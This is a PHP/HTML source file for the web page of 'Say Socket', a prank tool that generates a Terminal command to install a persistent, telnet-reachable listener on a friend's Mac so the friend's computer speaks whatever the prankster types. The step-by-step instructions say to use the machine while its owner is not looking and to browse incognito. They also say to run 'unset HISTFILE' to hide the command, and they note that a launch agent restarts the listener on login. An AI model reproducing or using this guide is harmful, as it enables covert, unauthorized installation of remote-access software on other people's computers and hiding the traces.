<?php
require_once '../inc/config.inc';

global $ss_config, $b64_config;
?>

<!doctype html>
<html lang="es">
    <head>
        <meta charset="utf-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />

        <meta name="description" content="Have friends who own a Mac? Do they leave it unlocked? Give life to their Mac, make it speak!">
        <meta name="keywords" content="PHP,OSX,say,socket,say socket,saysocket,text-to-speech,text to speech,troll,funny,stupid,script,prank">
        <meta name="author" content="Charlie McClung">

        <meta property="og:url"                content="<?php echo SERVER_HOST; ?>" />
        <meta property="og:type"               content="website" />
        <meta property="og:title"              content="Say Socket" />
        <meta property="og:description"        content="Have friends who own a Mac? Do they leave it unlocked? Give life to their Mac, make it speak!" />
        <meta property="og:image"              content="<?php echo SERVER_HOST; ?>img/saysocket.png" />

        <title>Say Socket</title>

        <link rel="apple-touch-icon" sizes="57x57" href="/icons/apple-icon-57x57.png">
        <link rel="apple-touch-icon" sizes="60x60" href="/icons/apple-icon-60x60.png">
        <link rel="apple-touch-icon" sizes="72x72" href="/icons/apple-icon-72x72.png">
        <link rel="apple-touch-icon" sizes="76x76" href="/icons/apple-icon-76x76.png">
        <link rel="apple-touch-icon" sizes="114x114" href="/icons/apple-icon-114x114.png">
        <link rel="apple-touch-icon" sizes="120x120" href="/icons/apple-icon-120x120.png">
        <link rel="apple-touch-icon" sizes="144x144" href="/icons/apple-icon-144x144.png">
        <link rel="apple-touch-icon" sizes="152x152" href="/icons/apple-icon-152x152.png">
        <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-icon-180x180.png">
        <link rel="icon" type="image/png" sizes="192x192"  href="/icons/android-icon-192x192.png">
        <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="96x96" href="/icons/favicon-96x96.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
        <link rel="manifest" href="/manifest.json">
        <meta name="msapplication-TileColor" content="#ffffff">
        <meta name="msapplication-TileImage" content="/icons/ms-icon-144x144.png">
        <meta name="theme-color" content="#ffffff">

        <link rel="stylesheet" type="text/css" href="css/reset.css" />
        <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css" />
        <link rel="stylesheet" type="text/css" href="css/bootstrap-theme.min.css" />
        <link rel="stylesheet" type="text/css" href="css/socicon.css" />
        <link rel="stylesheet" type="text/css" href="css/site.css" />
    </head>

    <body>
        <script>
            (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
                    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
                m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
            })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

            ga('create', 'UA-65431506-1', 'auto');
            ga('send', 'pageview');
        </script>

        <div class="scrapers">
          <div class="scraper left">
            <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
            <!-- SS Skyscraper -->
            <ins class="adsbygoogle"
                 style="display:inline-block;width:300px;height:600px"
                 data-ad-client="ca-pub-1152878338835253"
                 data-ad-slot="5073858524"></ins>
            <script>
              (adsbygoogle = window.adsbygoogle || []).push({});
            </script>
          </div>
          <div class="scraper right">
            <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
            <!-- SS Skyscraper -->
            <ins class="adsbygoogle"
                 style="display:inline-block;width:300px;height:600px"
                 data-ad-client="ca-pub-1152878338835253"
                 data-ad-slot="5073858524"></ins>
            <script>
              (adsbygoogle = window.adsbygoogle || []).push({});
            </script>
          </div>
        </div>
        <section class="ads">
            <div class="container">
                <div class="row">
                    <div class="col-xs-12">
                        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
                        <!-- SS Responsive -->
                        <ins class="adsbygoogle"
                             style="display:block"
                             data-ad-client="ca-pub-1152878338835253"
                             data-ad-slot="9471259722"
                             data-ad-format="auto"></ins>
                        <script>
                            (adsbygoogle = window.adsbygoogle || []).push({});
                        </script>
                    </div>
                </div>
            </div>
        </section>

        <header>
            <div class="container">
                <div class="row">
                    <div class="col-xs-12">
                        <h1>Say Socket <span class="total-wrap"><span class="total"></span> sockets opened</span></h1>
                    </div>
                    <div class="col-xs-12">
                        <p>
                          <a class="btn btn-primary ga-event" target="_blank" href="https://github.com/5290charlie/SaySocket" data-ga-category="Button" data-ga-action="click" data-ga-label="GitHub">
                            <span class="icon socicon-github"></span>
                            View on GitHub
                          </a>
                        </p>
                    </div>
                </div>
            </div>
        </header>

        <section class="main">
            <div class="container">
                <div class="row">
                    <div class="col-xs-12">
                        <div class="msgs">

                        </div>
                    </div>
                </div>
                <div class="row">
                    <div class="col-xs-12">
                        <p>Did you know that OSX (Mac) has a command to make the computer talk?</p>
                        <p>
                            It's freaking hilarious! After playing around with this new discovery,
                            I began do dream up some troll applications to prank friends using this command.
                            Say Socket is the latest iteration of my say prank scripts. Enjoy!
                        </p>
                        <p>Signup below to generate an installation command that will notify you by email when the socket is accessed*</p>
                    </div>
                </div>
                <div class="row">
                    <div class="col-xs-12">
                        <form method="post" data-action="generate">
                            <div class="form-group">
                                <label class="sr-only" for="email">Email address</label>
                                <input id="email" type="email" name="email" class="form-control form-input" placeholder="Email" />
                            </div>
                            <button type="submit" class="btn btn-success form-control ga-event" data-ga-category="Button" data-ga-action="click" data-ga-label="Generate">
                              <span class="glyphicon glyphicon-cog"></span>
                              Generate
                            </button>
                        </form>
                    </div>
                </div>
                <div class="row result">
                    <div class="col-xs-12">
                        <input id="cmd" type="text" class="form-control" readonly placeholder="Command" />
                        <button class="btn btn-primary form-control select-ctrl ga-event" select-target="#cmd" data-ga-category="Button" data-ga-action="click" data-ga-label="Select">
                          Select Command
                        </button>
                    </div>
                </div>
                <div class="row">
                    <div class="col-xs-12">
                        <div class="instructions">
                            <h2>Instructions:</h2>
                            <ol>
                                <li>Hop on your buddies computer when they're not looking</li>
                                <li>Navigate a web browser (incognito if you want to hide traffic) to <a href="<?php echo SERVER_HOST; ?>"><?php echo SERVER_HOST; ?></a></li>
                                <li>Enter <strong>your</strong> email and click "Generate"</li>
                                <li>Select &amp; copy the command given</li>
                                <li>Open the Terminal (open a new tab if Terminal is already running)</li>
                                <li>
                                    Paste your command and run! (Hit "ENTER"):
                                    <pre id="instructions-cmd"> $ <?php echo parse_file_contents('cmd', 'XXXXXXXXXXXXXXXX', true); ?></pre>
                                    <p class="extra">
                                      <strong>NOTE:</strong> If you want to be extra sneaky, disable bash history before running your command:
                                      <pre> $ unset HISTFILE</pre>
                                    </p>
                                </li>
                                <li>
                                    Close the terminal window opened by you
                                    <p class="extra">The email you used to generate the installer will be notified once the SS portal has successfully opened</p>
                                </li>
                                <li>
                                    With IP and Port specified in the notification email, connect using telnet
                                    <pre> $ telnet [IP ADDRESS] [PORT]</pre>
                                    This should look something like this:
                                    <pre> $ telnet 192.168.1.100 12345</pre>
                                    <p class="extra"><strong>NOTE:</strong> If connecting via PuTTY (Windows), use the "Raw" connection type instead of "Telnet".</p>
                                </li>
                                <li>
                                    If your connection is successful, you should see this welcome message along with the say prompt:
                                    <pre><?php echo $b64_config['STR_WELCOME_MSG']; ?></pre>
                                </li>
                                <li>
                                    Now anything you type will be spoken by their computer!
                                    <p class="extra">Except special characters and existing shell commands</p>
                                </li>
                                <li>
                                    <hr>
                                    <h3>Are they confused and attempting to mute their sound?<br />Good thing it comes with a volume override!</h3>
                                    Instead of entering something silly for their computer to say, use the custom "volume" command
                                    <p class="extra">The "volume" command will accept integer [0-9] as the volume level</p>
                                    <pre> say> volume 9</pre>
                                </li>
                                <li>
                                    <hr>
                                    <h3>You got caught and they're pissed.<br />Good thing it comes with an uninstall script!</h3>
                                    To remove SaySocket completely from their system run:
                                    <pre> $ ss_remove</pre>
                                    <p class="extra">The initial install will create "<?php echo $ss_config['FILE_INSTALLER']; ?>" and "<?php echo $ss_config['FILE_REMOVER']; ?>" inside of ~/<?php echo $ss_config['DIR_LOCAL_BIN']; ?></p>
                                    <p class="extra">The "<?php echo $ss_config['FILE_INSTALLER']; ?>" script is a copy of the original install script</p>
                                    The removal process should look something like this:
                                    <p class="extra">You MUST answer "y" or "n" to all questions asked during removal</p>
<pre>Unload launch agent? (y/n) y
Remove file: ~/<?php echo $ss_config['DIR_LAUNCH_AGENTS'] . '/' . $ss_config['FILE_LAUNCH_PLIST'] . '.plist'; ?>? (y/n) y
Remove directory: ~/<?php echo $ss_config['DIR_MAIN']; ?>? (y/n) y
Remove file: <?php echo $ss_config['DIR_LOCAL_BIN'] . '/' . $ss_config['FILE_INSTALLER']; ?>? (y/n) y
Remove file: <?php echo $ss_config['DIR_LOCAL_BIN'] . '/' . $ss_config['FILE_REMOVER']; ?>? (y/n) y
SS removal complete.</pre>
                                </li>
                            </ol>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <footer>
            <div class="container">
                <div class="row">
                    <div class="col-xs-12">
                        <p>*By signing up with Say Socket, you are allowing email notifications when your installed socket is opened.</p>
                        <p>Your email will never be given or shown anywhere outside the Say Socket signup database</p>
                        <p>USE AT YOUR OWN RISK! Make sure to only prank close friends that can take a joke!</p>
                        <p>Only applicable within a simple local network setting (without complex port forwarding)</p>
                        <p>This will create a launchctl .plist file in ~/<?php echo $ss_config['DIR_LAUNCH_AGENTS'] . '/' . $ss_config['FILE_LAUNCH_PLIST']; ?>.plist causing it to restart on login</p>
                    </div>
                </div>
            </div>
        </footer>

        <script type="text/javascript" src="js/jquery.min.js"></script>
        <script type="text/javascript" src="js/bootstrap.min.js"></script>
        <script type="text/javascript" src="js/site.js"></script>
    </body>
</html>
